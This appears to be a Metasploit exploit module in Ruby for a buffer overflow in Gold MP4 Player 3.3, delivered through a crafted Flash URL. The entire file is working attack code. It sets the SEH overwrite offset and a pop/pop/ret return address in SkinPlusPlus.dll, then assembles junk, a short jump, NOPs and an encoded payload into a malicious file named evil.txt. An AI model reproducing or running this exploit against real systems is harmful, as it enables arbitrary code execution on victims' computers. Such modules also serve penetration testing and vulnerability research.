 
class Metasploit3 < Msf::Exploit::Remote
    Rank = NormalRanking
 
    include Msf::Exploit::FILEFORMAT
    include Msf::Exploit::Remote::Seh
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;Gold MP4 Player 3.3 Universal SEH Exploit&#039;,
            &#039;Description&#039;    => %q{
                    This module exploits a buffer overflow in Gold MP4 Player 3.3.
                    When this application is loaded a special crafted Flash URL via File -> Open Flash URL. Buffer overflow happens and it allowing arbitrary code execution.
            },
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Author&#039;         =>
                [
                    &#039;Revin Hadi S&#039;, #Exploit & MSF Module
                    &#039;Gabor Seljan&#039; #Vulnerability POC
                ],
            &#039;Version&#039;        => &#039;$Revision: $&#039;,
            &#039;References&#039;     =>
                [
                    [ &#039;URL&#039;, &#039;http://www.exploit-db.com/exploits/31914/&#039; ],
                ],
            &#039;DefaultOptions&#039; =>
                {
                    &#039;EXITFUNC&#039; => &#039;seh&#039;,
                    &#039;DisablePayloadHandler&#039; => &#039;true&#039;
                },
            &#039;Payload&#039;        =>
                {
                    &#039;Space&#039;    => 1000,
                    &#039;BadChars&#039; => "\x00\x0a\x0d\x20",
                    &#039;StackAdjustment&#039; => -3500,
                },
            &#039;Platform&#039; => &#039;win&#039;,
            &#039;Targets&#039;        =>
                [
                    [ &#039;Windows Universal&#039;, { &#039;Ret&#039; => 0x100F041C, &#039;Offset&#039; => 253 } ],    #/p/p/r SkinPlusPlus.dll
                ],
            &#039;Privileged&#039;     => false,
            &#039;DisclosureDate&#039; => &#039;Date&#039;,
            &#039;DefaultTarget&#039;  => 0))
 
            register_options(
                [
                    OptString.new(&#039;FILENAME&#039;, [ true, &#039;The file name contains malicious Flash URL.&#039;,  &#039;evil.txt&#039;]),
                ], self.class)
 
    end
 
    def exploit
        http = "http://"
        junk = "\x41" * (target[&#039;Offset&#039;])
        nseh = "\xEB\x06\x90\x90"
        format = ".swf"
        sploit = http + junk + nseh + [target[&#039;Ret&#039;]].pack(&#039;V&#039;) + make_nops(16) + payload.encoded + format
       
        print_status("Creating &#039;#{datastore[&#039;FILENAME&#039;]}&#039; file ...")
 
        file_create(sploit)
 
    end
 
end

